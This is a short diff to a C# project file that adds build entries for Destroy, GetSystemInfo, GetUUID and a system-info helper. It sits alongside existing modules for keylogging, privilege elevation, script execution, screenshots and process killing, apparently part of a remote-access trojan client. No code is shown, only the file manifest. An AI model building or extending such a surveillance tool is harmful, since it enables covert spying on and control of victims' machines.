@@ -59,6 +59,7 @@
   <ItemGroup>
     <Compile Include="Config\Settings.cs" />
     <Compile Include="Core\Events\Close.cs" />
+    <Compile Include="Core\Events\Destroy.cs" />
     <Compile Include="Core\Events\Elevate.cs" />
     <Compile Include="Core\Events\ExecuteScript.cs" />
     <Compile Include="Core\Events\GetDirectorContent.cs" />
@@ -66,9 +67,11 @@
     <Compile Include="Core\Events\GetKeylogChunk.cs" />
     <Compile Include="Core\Events\GetKeylogDumpLength.cs" />
     <Compile Include="Core\Events\GetProcess.cs" />
+    <Compile Include="Core\Events\GetSystemInfo.cs" />
     <Compile Include="Core\Events\GetUserName.cs" />
     <Compile Include="Core\Events\GetAccountType.cs" />
     <Compile Include="Core\Events\GetOperatingSystem.cs" />
+    <Compile Include="Core\Events\GetUUID.cs" />
     <Compile Include="Core\Events\KillProcess.cs" />
     <Compile Include="Core\Events\MouseEvent.cs" />
     <Compile Include="Core\Events\OpenWebsite.cs" />
@@ -83,6 +86,7 @@
     <Compile Include="Core\Helper\InputHelper.cs" />
     <Compile Include="Core\Helper\MutexHelper.cs" />
     <Compile Include="Core\Helper\ScreenshotHelper.cs" />
+    <Compile Include="Core\Helper\SystemInfoHelper.cs" />
     <Compile Include="Core\Helper\WindowsAccountHelper.cs" />
     <Compile Include="Core\Keylogging\Keylogger.cs" />
     <Compile Include="Core\Networking\NetworkManager.cs" />
